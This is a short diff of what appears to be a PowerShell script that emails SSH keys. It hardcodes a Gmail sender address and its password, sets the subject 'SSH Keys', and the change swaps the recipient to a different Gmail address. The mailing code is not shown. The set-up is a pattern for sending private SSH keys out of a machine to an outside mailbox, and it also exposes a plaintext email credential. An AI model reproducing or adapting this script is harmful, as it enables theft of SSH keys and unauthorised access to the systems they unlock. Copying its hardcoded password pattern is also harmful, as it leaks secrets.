@@ -1,7 +1,7 @@
 # Set variables
 $fromEmail = "johnatom336@gmail.com"
 $fromPassword = "ygthncnfxnumudwz"
-$toEmail = "subdesihiphop@gmail.com"
+$toEmail = "mail.toxysec@gmail.com"
 $subject = "SSH Keys"
 $body = "Please find attached the SSH keys."
 
